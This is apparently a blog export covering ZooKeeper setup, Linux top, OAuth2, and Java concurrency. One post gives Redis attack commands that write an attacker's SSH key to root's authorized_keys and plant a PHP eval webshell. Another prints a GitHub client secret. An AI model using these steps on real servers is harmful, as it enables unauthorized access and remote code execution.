    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="服务器数量选择"><a href="#服务器数量选择" class="headerlink" title="服务器数量选择"></a>服务器数量选择</h1><p>​ 本次搭建采用3台服务器。在每台机器数据保持一致的情况下，zookeeper集群可以保证，客户端发起的每次查询操作，集群节点都能返回同样的结果。</p><p>　　但是对于客户端发起的修改、删除等能改变数据的操作呢？集群中那么多台机器，你修改你的，我修改我的，最后返回集群中哪台机器的数据呢？</p><p>　　这就是一盘散沙，需要一个领导，于是在zookeeper集群中，leader的作用就体现出来了，只有leader节点才有权利发起修改数据的操作，而follower节点即使接收到了客户端发起的修改操作，也要将其转交给leader来处理，leader接收到修改数据的请求后，会向所有follower广播一条消息，让他们执行某项操作，follower 执行完后，便会向 leader 回复执行完毕。当 leader 收到半数以上的 follower 的确认消息，便会判定该操作执行完毕，然后向所有 follower 广播该操作已经生效。</p><p>　　所以zookeeper集群中leader是不可缺少的，但是 leader 节点是怎么产生的呢？其实就是由所有follower 节点选举产生的，讲究民主嘛，而且leader节点只能有一个，毕竟一个国家不能有多个总统。</p><p>　　这个时候回到我们的小标题，为什么 zookeeper 节点数是奇数，我们下面来一一来说明：</p><p>　　<strong>容错率</strong></p><p>　　首先从容错率来说明：（需要保证集群能够有半数进行投票）</p><p>　　2台服务器，至少2台正常运行才行（2的半数为1，半数以上最少为2），正常运行1台服务器都不允许挂掉，但是相对于 单节点服务器，2台服务器还有两个单点故障，所以直接排除了。</p><p>　　3台服务器，至少2台正常运行才行（3的半数为1.5，半数以上最少为2），正常运行可以允许1台服务器挂掉</p><p>　　4台服务器，至少3台正常运行才行（4的半数为2，半数以上最少为3），正常运行可以允许1台服务器挂掉</p><p>　　5台服务器，至少3台正常运行才行（5的半数为2.5，半数以上最少为3），正常运行可以允许2台服务器挂掉</p><p>　　<strong>防脑裂</strong></p><p>　　脑裂集群的脑裂通常是发生在节点之间通信不可达的情况下，集群会分裂成不同的小集群，小集群各自选出自己的leader节点，导致原有的集群出现多个leader节点的情况，这就是脑裂。</p><p>　　3台服务器，投票选举半数为1.5，一台服务裂开，和另外两台服务器无法通行，这时候2台服务器的集群（2票大于半数1.5票），所以可以选举出leader，而 1 台服务器的集群无法选举。</p><p>　　4台服务器，投票选举半数为2，可以分成 1,3两个集群或者2,2两个集群，对于 1,3集群，3集群可以选举；对于2,2集群，则不能选择，造成没有leader节点。</p><p>　　5台服务器，投票选举半数为2.5，可以分成1,4两个集群，或者2,3两集群，这两个集群分别都只能选举一个集群，满足zookeeper集群搭建数目。</p><p>　　以上分析，我们从容错率以及防止脑裂两方面说明了3台服务器是搭建集群的最少数目，4台发生脑裂时会造成没有leader节点的错误。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul><li><p>下载解压</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载</span><br><span class="line">wget https:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;zookeeper&#x2F;zookeeper-3.7.0&#x2F;apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line"># 解压</span><br><span class="line">tar -zxvf apache-zookeeper-3.7.0-bin.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>修改zoo_sample.cfg文件</p><p>重命名zoo_sample.cfg为zoo.cfg</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dataDir &#x3D; &#x2F;data&#x2F;dataos&#x2F;apache-zookeeper-3.7.0-bin&#x2F;data</span><br><span class="line">server.0&#x3D;192.168.28.152:2888:3888</span><br><span class="line">server.1&#x3D;192.168.28.156:2888:3888</span><br><span class="line">server.2&#x3D;192.168.28.157:2888:3888</span><br></pre></td></tr></table></figure></li><li><p>创建 myid 文件</p><p>在 上一步 dataDir 指定的目录下，创建 myid 文件。依次在3个服务器写入server.x的X。</p></li><li><p>启动zookeeper服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;zkServer.sh start</span><br></pre></td></tr></table></figure></li><li><p>验证zookeeper集群是否搭建成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zkServer.sh status</span><br></pre></td></tr></table></figure><p>出现mode:leader或mode:follower表示成功</p><p>出现*<em>Client port found: 2181. Client address: localhost. Client SSL: false. Error contacting service. It *</em>表示启动失败，检查端口是否占用，java环境是否配置，节点IP是否配置正确，防火墙是否放开。</p></li></ul><!-- rebuild by neat -->]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常用基础软件</title>
    <url>/2021/10/13/57696/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><p><strong>端口占用及杀进程</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -tunlp | grep 8000</span><br><span class="line">#lsof -i 需要 root 用户的权限来执行</span><br><span class="line">#lsof和ps -ef 均可以由名称查看进程</span><br><span class="line">lsof -i:8000</span><br><span class="line">ps -ef | grep 8000</span><br></pre></td></tr></table></figure><p><strong>top</strong></p><p>top命令相当于windows的任务管理器</p><p><img src="/2021/10/13/57696/1.jpg" alt></p><p>下面逐行解释这些内容代表什么含义。</p><ul><li><p><strong>第一行：概况</strong><br><code>HH:mm:ss</code>：当前的系统时间。<br><code>up xxx days, HH:mm</code>：从本次开机到现在经过的时间。<br><code>x user</code>：当前有几个用户登录到该机器。<br><code>load average</code>：系统1分钟、5分钟、15分钟内的平均负载值。</p></li><li><p><strong>第二行：进程计数（Tasks）</strong><br><code>total</code>：进程总数。<br><code>running</code>：正在运行的进程数，对应状态TASK_RUNNING。<br><code>sleeping</code>：睡眠的进程数，对应状态TASK_INTERRUPTIBLE和TASK_UNINTERRUPTIBLE。<br><code>stopped</code>：停止的进程数，对应状态TASK_STOPPED。<br><code>zombie</code>：僵尸进程数，对应状态TASK_ZOMBIE。<br>既然已经提到了Linux下的进程状态，干脆直接复习一下进程状态的转换吧。</p></li><li><p><strong>第三行：CPU使用率（%Cpu(s)）</strong><br><code>us</code>：进程在用户空间（user）消耗的CPU时间占比，不包含调整过优先级的进程。<br><code>sy</code>：进程在内核空间（system）消耗的CPU时间占比。<br><code>ni</code>：调整过用户态优先级的（niced）进程的CPU时间占比。<br><code>id</code>：空闲的（idle）CPU时间占比。<br><code>wa</code>：等待（wait）I/O完成的CPU时间占比。<br><code>hi</code>：处理硬中断（hardware interrupt）的CPU时间占比。<br><code>si</code>：处理软中断（software interrupt）的CPU时间占比。<br><code>st</code>：当Linux系统是在虚拟机中运行时，等待CPU资源的时间（steal time）占比。</p></li><li><p><strong>第四、五行：物理内存和交换空间（Mem/Swap）</strong><br>以物理内存为例。free命令也会打印出类似的信息。<br><code>total</code>：内存总量。<br><code>free</code>：空闲内存量。<br><code>used</code>：使用中的内存量。<br><code>buff/cache</code>：缓存和page cache占用的内存量。</p></li><li><p><strong>以下所有行：进程详细信息</strong><br>这里显示的数据列是可以改的，默认会显示如图中的12列。其含义分别如下：<br><code>PID</code>：进程ID。<br><code>USER</code>：进程所有者的用户名。<br><code>PR</code>：从系统内核角度看的进程调度优先级。<br><code>NI</code>：进程的nice值，即从用户空间角度看的进程优先级。值越低，优先级越高。<br><code>VIRT</code>：进程申请使用的虚拟内存量。<br><code>RES</code>：进程使用的驻留内存（即未被swap out的内存）量。<br><code>SHR</code>：进程使用的共享内存量。<br><code>S</code>：进程状态。R=running，S=interruptible sleeping，D=uninterruptible sleeping，T=stopped，Z=zombie。<br><code>%CPU</code>：进程在一个更新周期内占用的CPU时间比例。<br><code>%MEM</code>：进程占用的物理内存比例。<br><code>TIME+</code>：进程创建后至今占用的CPU时间长度。<br><code>COMMAND</code>：运行进程使用的命令。</p></li></ul><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常用基础软件</title>
    <url>/2021/10/13/57695/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>redis渗透</title>
    <url>/2021/10/13/27079/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="ssh秘钥登录"><a href="#ssh秘钥登录" class="headerlink" title="ssh秘钥登录"></a>ssh秘钥登录</h1><p>目标服务器需要root启动redis，且redis在<code>/root/.ssh</code>有写入文件权限。非root用户也可，但需要猜用户名，且redis需要有相应目录写入权限。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#生成密钥</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">#防止乱码导入到key文件中</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">#连接redis，写入key.txt</span><br><span class="line">cat &#x2F;home&#x2F;kali&#x2F;.ssh&#x2F;key.txt | .&#x2F;redis-cli -h ip -p port -a password -x set key</span><br><span class="line">#连接redis</span><br><span class="line">.&#x2F;redis-cli -h ip -p port -a password</span><br><span class="line">#修改redis持久化目录</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">#修改redis持久化文件名</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">#持久化</span><br><span class="line">save</span><br><span class="line">#登录目标服务器</span><br><span class="line">ssh -i &#x2F;home&#x2F;kali&#x2F;.ssh&#x2F;id_rsa root@ip</span><br></pre></td></tr></table></figure><h1 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h1><p>目标服务器开着web服务，清楚web服务目录，且redis在web目录下有写入权限。</p><p>和ssh秘钥登录一样，不同的是将一句话木马写入web目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#准备PHP脚本</span><br><span class="line">&lt;?php @eval($_POST[&#39;hacker&#39;]); ?&gt;</span><br><span class="line">#防止乱码导入到key文件中</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat hacker.php; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">#连接redis，写入key.txt</span><br><span class="line">cat key.txt | .&#x2F;redis-cli -h ip -p port -a password -x set key</span><br><span class="line">#连接redis</span><br><span class="line">.&#x2F;redis-cli -h ip -p port -a password</span><br><span class="line">#修改redis持久化目录为web服务目录</span><br><span class="line">config set dir &#x2F;www&#x2F;admin&#x2F;localhost_80&#x2F;wwwroot</span><br><span class="line">#修改redis持久化文件名</span><br><span class="line">config set dbfilename hacker.php</span><br><span class="line">#持久化</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>打开蚁剑，加入目标webshell，url为hacker.php路径，密码为hacker。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透，redis</tag>
      </tags>
  </entry>
  <entry>
    <title>OAuth2第三方登录示例</title>
    <url>/2021/08/20/46950/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h2 id="第三方登录的原理"><a href="#第三方登录的原理" class="headerlink" title="第三方登录的原理"></a>第三方登录的原理</h2><p>所谓第三方登录，实质就是 OAuth 授权。用户想要登录 A 网站，A 网站让用户提供第三方网站的数据，证明自己的身份。获取第三方网站的身份数据，就需要 OAuth 授权。</p><p>举例来说，A 网站允许 GitHub 登录，背后就是下面的流程。</p><blockquote><ol><li>A 网站让用户跳转到 GitHub。</li><li>GitHub 要求用户登录，然后询问”A 网站要求获得 xx 权限，你是否同意？”</li><li>用户同意，GitHub 就会重定向回 A 网站，同时发回一个授权码。</li><li>A 网站使用授权码，向 GitHub 请求令牌。</li><li>GitHub 返回令牌.</li><li>A 网站使用令牌，向 GitHub 请求用户数据。</li></ol></blockquote><p>下面就是这个流程的代码实现。</p><h2 id="二、应用登记"><a href="#二、应用登记" class="headerlink" title="二、应用登记"></a>二、应用登记</h2><p>一个应用要求 OAuth 授权，必须先到对方网站登记，让对方知道是谁在请求。</p><p>所以，你要先去 GitHub 登记一下。当然，我已经登记过了，你使用我的登记信息也可以，但为了完整走一遍流程，还是建议大家自己登记。这是免费的。</p><p>访问这个<a href="https://github.com/settings/applications/new" target="_blank" rel="noopener">网址</a>，填写登记表。</p><p><img src="/2021/08/20/46950/1.jpg" alt="img"></p><p>应用的名称随便填，主页 URL 填写<code>http://localhost:8080</code>，跳转网址填写 <code>http://localhost:8080/oauth/redirect</code>。</p><p>提交表单以后，GitHub 应该会返回客户端 ID（client ID）和客户端密钥（client secret），这就是应用的身份识别码。</p><p>client ID:755770b16c44e721d6d2</p><p>client secret:7f8c427f37338a0ffcc18909a5bfa0597f14d58e</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>OAuth2</category>
      </categories>
      <tags>
        <tag>OAuth2，认证</tag>
      </tags>
  </entry>
  <entry>
    <title>OAuth2基础概念</title>
    <url>/2021/08/18/16812/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="OAuth2简单理解"><a href="#OAuth2简单理解" class="headerlink" title="OAuth2简单理解"></a>OAuth2简单理解</h1><blockquote><p>OAuth2是<strong>开放授权的一个标准</strong>，旨在让<strong>用户</strong>允许<strong>第三方应用</strong>去访问改用户在<strong>某服务器</strong>中的特定<strong>私有资源</strong>，而可以不提供其在某服务器的账号密码给到第三方应用</p></blockquote><p>简单说，OAuth 就是一种授权机制。数据的所有者告诉系统，同意授权第三方应用进入系统，获取这些数据。系统从而产生一个短期的进入令牌（token），用来代替密码，供第三方应用使用。</p><p>注意，不管哪一种授权方式，第三方应用申请令牌之前，都必须先到系统备案，说明自己的身份，然后会拿到两个身份识别码：客户端 ID（client ID）和客户端密钥（client secret）。这是为了防止令牌被滥用，没有备案过的第三方应用，是不会拿到令牌的。</p><p>#OAuth2四种授权模式</p><p>##授权码</p><p><strong>授权码（authorization code）方式，指的是第三方应用先申请一个授权码，然后再用该码获取令牌。</strong></p><p>这种方式是最常用的流程，安全性也最高，它适用于那些有后端的 Web 应用。授权码通过前端传送，令牌则是储存在后端，而且所有与资源服务器的通信都在后端完成。这样的前后端分离，可以避免令牌泄漏。</p><p>第一步，A 网站提供一个链接，用户点击后就会跳转到 B 网站，授权用户数据给 A 网站使用。下面就是 A 网站跳转 B 网站的一个示意链接。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//b.com/oauth/authorize?</span></span><br><span class="line">  response_type=code&amp;</span><br><span class="line">  client_id=CLIENT_ID&amp;</span><br><span class="line">  redirect_uri=CALLBACK_URL&amp;</span><br><span class="line">  scope=read</span><br></pre></td></tr></table></figure></blockquote><p>上面 URL 中，<code>response_type</code>参数表示要求返回授权码（<code>code</code>），<code>client_id</code>参数让 B 知道是谁在请求，<code>redirect_uri</code>参数是 B 接受或拒绝请求后的跳转网址，<code>scope</code>参数表示要求的授权范围（这里是只读）。</p><p><img src="/2021/08/18/16812/1.jpg" alt="img"></p><p>第二步，用户跳转后，B 网站会要求用户登录，然后询问是否同意给予 A 网站授权。用户表示同意，这时 B 网站就会跳回<code>redirect_uri</code>参数指定的网址。跳转时，会传回一个授权码，就像下面这样。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//a.com/callback?code=AUTHORIZATION_CODE</span></span><br></pre></td></tr></table></figure></blockquote><p>上面 URL 中，<code>code</code>参数就是授权码。</p><p><img src="/2021/08/18/16812/2.jpg" alt="img"></p><p>第三步，A 网站拿到授权码以后，就可以在后端，向 B 网站请求令牌。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//b.com/oauth/token?</span></span><br><span class="line"> client_id=CLIENT_ID&amp;</span><br><span class="line"> client_secret=CLIENT_SECRET&amp;</span><br><span class="line"> grant_type=authorization_code&amp;</span><br><span class="line"> code=AUTHORIZATION_CODE&amp;</span><br><span class="line"> redirect_uri=CALLBACK_URL</span><br></pre></td></tr></table></figure></blockquote><p>上面 URL 中，<code>client_id</code>参数和<code>client_secret</code>参数用来让 B 确认 A 的身份（<code>client_secret</code>参数是保密的，因此只能在后端发请求），<code>grant_type</code>参数的值是<code>AUTHORIZATION_CODE</code>，表示采用的授权方式是授权码，<code>code</code>参数是上一步拿到的授权码，<code>redirect_uri</code>参数是令牌颁发后的回调网址。</p><p><img src="/2021/08/18/16812/3.jpg" alt="img"></p><p>第四步，B 网站收到请求以后，就会颁发令牌。具体做法是向<code>redirect_uri</code>指定的网址，发送一段 JSON 数据。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"access_token"</span>:<span class="string">"ACCESS_TOKEN"</span>,</span><br><span class="line">  <span class="string">"token_type"</span>:<span class="string">"bearer"</span>,</span><br><span class="line">  <span class="string">"expires_in"</span>:<span class="number">2592000</span>,</span><br><span class="line">  <span class="string">"refresh_token"</span>:<span class="string">"REFRESH_TOKEN"</span>,</span><br><span class="line">  <span class="string">"scope"</span>:<span class="string">"read"</span>,</span><br><span class="line">  <span class="string">"uid"</span>:<span class="number">100101</span>,</span><br><span class="line">  <span class="string">"info"</span>:&#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>上面 JSON 数据中，<code>access_token</code>字段就是令牌，A 网站在后端拿到了。</p><p><img src="/2021/08/18/16812/4.jpg" alt="img"></p><p>##隐藏式</p><p>有些 Web 应用是纯前端应用，没有后端。这时就不能用上面的方式了，必须将令牌储存在前端，这种方式没有授权码这个中间步骤，所以称为（授权码）”隐藏式”（implicit）。</p><p>第一步，A 网站提供一个链接，要求用户跳转到 B 网站，授权用户数据给 A 网站使用。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//b.com/oauth/authorize?</span></span><br><span class="line">  response_type=token&amp;</span><br><span class="line">  client_id=CLIENT_ID&amp;</span><br><span class="line">  redirect_uri=CALLBACK_URL&amp;</span><br><span class="line">  scope=read</span><br></pre></td></tr></table></figure></blockquote><p>上面 URL 中，<code>response_type</code>参数为<code>token</code>，表示要求直接返回令牌。</p><p>第二步，用户跳转到 B 网站，登录后同意给予 A 网站授权。这时，B 网站就会跳回<code>redirect_uri</code>参数指定的跳转网址，并且把令牌作为 URL 参数，传给 A 网站。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//a.com/callback#token=ACCESS_TOKEN</span></span><br></pre></td></tr></table></figure></blockquote><p>上面 URL 中，<code>token</code>参数就是令牌，A 网站因此直接在前端拿到令牌。</p><p>注意，令牌的位置是 URL 锚点（fragment），而不是查询字符串（querystring），这是因为 OAuth 2.0 允许跳转网址是 HTTP 协议，因此存在”中间人攻击”的风险，而浏览器跳转时，锚点不会发到服务器，就减少了泄漏令牌的风险。</p><p><img src="/2021/08/18/16812/5.jpg" alt="img"></p><p>这种方式把令牌直接传给前端，是很不安全的。因此，只能用于一些安全要求不高的场景，并且令牌的有效期必须非常短，通常就是会话期间（session）有效，浏览器关掉，令牌就失效了。</p><h2 id="密码式"><a href="#密码式" class="headerlink" title="密码式"></a>密码式</h2><p><strong>如果你高度信任某个应用，用户把用户名和密码直接告诉该应用。该应用就使用你的密码，申请令牌，这种方式称为”密码式”（password）。</strong></p><p>第一步，A 网站要求用户提供 B 网站的用户名和密码。拿到以后，A 就直接向 B 请求令牌。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//oauth.b.com/token?</span></span><br><span class="line">  grant_type=password&amp;</span><br><span class="line">  username=USERNAME&amp;</span><br><span class="line">  password=PASSWORD&amp;</span><br><span class="line">  client_id=CLIENT_ID</span><br></pre></td></tr></table></figure></blockquote><p>上面 URL 中，<code>grant_type</code>参数是授权方式，这里的<code>password</code>表示”密码式”，<code>username</code>和<code>password</code>是 B 的用户名和密码。</p><p>第二步，B 网站验证身份通过后，直接给出令牌。注意，这时不需要跳转，而是把令牌放在 JSON 数据里面，作为 HTTP 回应，A 因此拿到令牌。</p><p>这种方式需要用户给出自己的用户名/密码，显然风险很大，因此只适用于其他授权方式都无法采用的情况，而且必须是用户高度信任的应用。</p><h2 id="第四种方式：凭证式"><a href="#第四种方式：凭证式" class="headerlink" title="第四种方式：凭证式"></a>第四种方式：凭证式</h2><p><strong>最后一种方式是凭证式（client credentials），适用于没有前端的命令行应用，即在命令行下请求令牌。</strong></p><p>第一步，A 应用在命令行向 B 发出请求。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//oauth.b.com/token?</span></span><br><span class="line">  grant_type=client_credentials&amp;</span><br><span class="line">  client_id=CLIENT_ID&amp;</span><br><span class="line">  client_secret=CLIENT_SECRET</span><br></pre></td></tr></table></figure></blockquote><p>上面 URL 中，<code>grant_type</code>参数等于<code>client_credentials</code>表示采用凭证式，<code>client_id</code>和<code>client_secret</code>用来让 B 确认 A 的身份。</p><p>第二步，B 网站验证通过以后，直接返回令牌。</p><p>这种方式给出的令牌，是针对第三方应用的，而不是针对用户的，即有可能多个用户共享同一个令牌。</p><h1 id="令牌的使用"><a href="#令牌的使用" class="headerlink" title="令牌的使用"></a>令牌的使用</h1><p>A 网站拿到令牌以后，就可以向 B 网站的 API 请求数据了。</p><p>此时，每个发到 API 的请求，都必须带有令牌。具体做法是在请求的头信息，加上一个<code>Authorization</code>字段，令牌就放在这个字段里面。</p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">"Authorization: Bearer ACCESS_TOKEN"</span> \</span><br><span class="line"><span class="string">"https://api.b.com"</span></span><br></pre></td></tr></table></figure></blockquote><p>上面命令中，<code>ACCESS_TOKEN</code>就是拿到的令牌。</p><h1 id="更新令牌"><a href="#更新令牌" class="headerlink" title="更新令牌"></a>更新令牌</h1><p>令牌的有效期到了，如果让用户重新走一遍上面的流程，再申请一个新的令牌，很可能体验不好，而且也没有必要。OAuth 2.0 允许用户自动更新令牌。</p><p>具体方法是，B 网站颁发令牌的时候，一次性颁发两个令牌，一个用于获取数据，另一个用于获取新的令牌（refresh token 字段）。令牌到期前，用户使用 refresh token 发一个请求，去更新令牌。</p><blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//b.com/oauth/token?</span></span><br><span class="line">  grant_type=refresh_token&amp;</span><br><span class="line">  client_id=CLIENT_ID&amp;</span><br><span class="line">  client_secret=CLIENT_SECRET&amp;</span><br><span class="line">  refresh_token=REFRESH_TOKEN</span><br></pre></td></tr></table></figure></blockquote><p>上面 URL 中，<code>grant_type</code>参数为<code>refresh_token</code>表示要求更新令牌，<code>client_id</code>参数和<code>client_secret</code>参数用于确认身份，<code>refresh_token</code>参数就是用于更新令牌的令牌。</p><p>B 网站验证通过以后，就会颁发新的令牌。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>OAuth2</category>
      </categories>
      <tags>
        <tag>OAuth2，认证</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Java并发编程（一）：到底什么是线程安全</title>
    <url>/2021/07/05/12033/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="什么是线程安全"><a href="#什么是线程安全" class="headerlink" title="什么是线程安全"></a>什么是线程安全</h1><p>线程安全，维基百科中的解释是：</p><blockquote><p>线程安全是编程中的术语，指某个函数、函数库在<strong>并发</strong>环境中被调用时，能够正确地处理<strong>多个线程</strong>之间的<strong>共享变量</strong>，使程序功能正确完成。</p></blockquote><p>我们把这个定义拆解一下，我们需要弄清楚这么几点： 1、并发 2、多线程 3、共享变量</p><h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><p>提到线程安全，必须要提及的一个词那就是并发，如果没有并发的话，那么也就不存在线程安全问题了。</p><h2 id="什么是并发"><a href="#什么是并发" class="headerlink" title="什么是并发"></a>什么是并发</h2><p>并发（Concurrent），在操作系统中，是指一个时间段中有几个程序都处于已启动运行到运行完毕之间，且这几个程序都是在同一个处理机上运行。</p><p>那么，操作系统视如何实现这种并发的呢？</p><p>现在我们用到操作系统，无论是Windows、Linux还是MacOS等其实都是<strong>多用户多任务分时操作系统</strong>。使用这些操作系统的用户是可以“同时”干多件事的。</p><p>但是实际上，对于单CPU的计算机来说，在CPU中，同一时间是只能干一件事儿的。为了看起来像是“同时干多件事”，分时操作系统是把CPU的时间划分成长短基本相同的时间区间,即”时间片”，通过操作系统的管理，把这些时间片依次轮流地分配给各个用户使用。</p><p>如果某个作业在时间片结束之前,整个任务还没有完成，那么该作业就被暂停下来,放弃CPU，等待下一轮循环再继续做.此时CPU又分配给另一个作业去使用。</p><p>由于计算机的处理速度很快，只要时间片的间隔取得适当,那么一个用户作业从用完分配给它的一个时间片到获得下一个CPU时间片，中间有所”停顿”，但用户察觉不出来,好像整个系统全由它”独占”似的。</p><p>所以，在单CPU的计算机中，我们看起来“同时干多件事”，其实是通过CPU时间片技术，并发完成的。</p><p>提到并发，还有另外一个词容易和他混淆，那就是并行。</p><h2 id="并发与并行之间的关系"><a href="#并发与并行之间的关系" class="headerlink" title="并发与并行之间的关系"></a>并发与并行之间的关系</h2><p>并行（Parallel），当系统有一个以上CPU时，当一个CPU执行一个进程时，另一个CPU可以执行另一个进程，两个进程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel)。</p><p>Erlang 之父 Joe Armstrong 用一张比较形象的图解释了并发与并行的区别：</p><p><img src="/2021/07/05/12033/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%5C%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%98%AF%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%5C1.jpg" alt></p><p>并发是两个队伍交替使用一台咖啡机。并行是两个队伍同时使用两台咖啡机。</p><p>映射到计算机系统中，上图中的咖啡机就是CPU，两个队伍指的就是两个进程。</p><h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>理解了并发和并行之间的关系和区别后，我们再回到前面介绍的多任务分时操作系统，看看CPU是如何进行进程调度的。</p><p>为了看起来像是“同时干多件事”，分时操作系统是把CPU的时间划分成长短基本相同的”时间片”，通过操作系统的管理，把这些时间片依次轮流地分配给各个用户的各个任务使用。</p><p>在多任务处理系统中，CPU需要处理所有程序的操作，当用户来回切换它们时，需要记录这些程序执行到哪里。在操作系统中，CPU切换到另一个进程需要保存当前进程的状态并恢复另一个进程的状态：当前运行任务转为就绪（或者挂起、删除）状态，另一个被选定的就绪任务成为当前任务。<strong>上下文切换</strong>就是这样一个过程，他允许CPU记录并恢复各种正在运行程序的状态，使它能够完成切换操作。</p><blockquote><p>在上下文切换过程中，CPU会停止处理当前运行的程序，并保存当前程序运行的具体位置以便之后继续运行。从这个角度来看，上下文切换有点像我们同时阅读几本书，在来回切换书本的同时我们需要记住每本书当前读到的页码。在程序中，上下文切换过程中的“页码”信息是保存在进程控制块（PCB）中的。PCB还经常被称作“切换帧”（switchframe）。“页码”信息会一直保存到CPU的内存中，直到他们被再次使用。</p></blockquote><p>对于操作系统来说，一个任务就是一个进程（Process），比如打开一个浏览器就是启动一个浏览器进程，打开一个记事本就启动了一个记事本进程，打开两个记事本就启动了两个记事本进程，打开一个Word就启动了一个Word进程。</p><p>而在多个进程之间切换的时候，需要进行上下文切换。但是上下文切换势必会耗费一些资源。于是人们考虑，能不能在一个进程中增加一些“子任务”，这样减少上下文切换的成本。比如我们使用Word的时候，它可以同时进行打字、拼写检查、字数统计等，这些子任务之间共用同一个进程资源，但是他们之间的切换不需要进行上下文切换。</p><p>在一个进程内部，要同时干多件事，就需要同时运行多个“子任务”，我们把进程内的这些“子任务”称为线程（Thread）。</p><p>随着时间的慢慢发展，人们进一步的切分了进程和线程之间的职责。<strong>把进程当做资源分配的基本单元，把线程当做执行的基本单元，同一个进程的多个线程之间共享资源</strong></p><p>拿我们比较熟悉的Java语言来说，Java程序是运行在JVM上面的，每一个JVM其实就是一个进程。所有的资源分配都是基于JVM进程来的。而在这个JVM进程中，又可以创建出很多线程，多个线程之间共享JVM资源，并且多个线程可以并发执行。</p><h1 id="共享变量"><a href="#共享变量" class="headerlink" title="共享变量"></a>共享变量</h1><p>所谓共享变量，指的是多个线程都可以操作的变量。</p><p>前面我们提到过，进程视分配资源的基本单位，线程是执行的基本单位。所以，多个线程之间是可以共享一部分进程中的数据的。在JVM中，Java堆和方法区的区域是多个线程共享的数据区域。也就是说，多个线程可以操作保存在堆或者方法区中的同一个数据。那么，换句话说，保存在堆和方法区中的变量就是Java中的共享变量。</p><p>那么，Java中哪些变量是存放在堆中，哪些变量是存放在方法区中，又有哪些变量是存放在栈中的呢？</p><h2 id="类变量、成员变量和局部变量"><a href="#类变量、成员变量和局部变量" class="headerlink" title="类变量、成员变量和局部变量"></a>类变量、成员变量和局部变量</h2><p>Java中共有三种变量，分别是类变量、成员变量和局部变量。他们分别存放在JVM的方法区、堆内存和栈内存中。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Hollis</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Variables</span> </span>&#123;</span><br><span class="line"></span><br><span 